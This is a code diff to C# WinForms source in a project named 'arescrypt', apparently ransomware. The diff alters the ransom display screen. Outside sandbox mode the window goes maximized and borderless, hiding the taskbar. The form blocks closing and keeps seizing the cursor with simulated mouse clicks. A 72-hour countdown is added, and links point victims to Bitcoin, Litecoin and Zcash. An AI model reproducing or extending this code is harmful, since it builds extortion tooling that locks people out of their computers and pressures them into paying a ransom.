@@ -12,13 +12,22 @@ namespace arescrypt
         [DllImport("user32.dll")]
         static extern void mouse_event(uint dwflag);
 
-        public Display() { InitializeComponent(); }
+        public Display() {
+            InitializeComponent();
+
+            if (!Program.sandBox) // == false
+            {   // This will maximize the screen, and eliminate the taskbar. 
+                this.WindowState = FormWindowState.Maximized;
+                this.FormBorderStyle = FormBorderStyle.None;
+            }
+        }
 
         private void Display_Load(object sender, EventArgs e) { }
 
         Point cursorPos = new Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2, Screen.PrimaryScreen.WorkingArea.Height / 2);
         private void timer1_tick(object sender, EventArgs e)
         {
+            
             Size size = Screen.PrimaryScreen.Bounds.Size;
             size.Height -= 10; size.Width -= 10;
             this.Size = size; this.Location = new Point(0, 0);
@@ -27,12 +36,13 @@ namespace arescrypt
             textBox1.Visible = true;
             Cursor.Position = cursorPos;
             mouse_event(0x002 | 0x004);
-        }
             
+        }
+
+        int timeLeft = 259200;
         private void timer1_Tick(object sender, EventArgs e)
         {
-            if (this.WindowState != FormWindowState.Maximized)
-                this.WindowState = FormWindowState.Maximized;
+            Console.WriteLine("Seconds left: " + timeLeft--);
         }
 
         private void preventClose(object sender, FormClosingEventArgs e)
@@ -50,24 +60,15 @@ namespace arescrypt
             mouse_event(0x002 | 0x004);
         }
 
-        private void RiseTimer_Tick(object sender, EventArgs e)
-        {
-
-        }
+        private void RiseTimer_Tick(object sender, EventArgs e) { }
 
         private void aboutBitcoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
-        {
-            Process.Start("https://bitcoin.org");
-        }
+        { Process.Start("https://bitcoin.org"); }
 
         private void aboutLitecoin_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
-        {
-            Process.Start("https://litecoin.com/");
-        }
+        { Process.Start("https://litecoin.com/"); }
 
         private void aboutZcash_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
-        {
-            Process.Start("https://z.cash/");
-        }
+        { Process.Start("https://z.cash/"); }
     }
 }
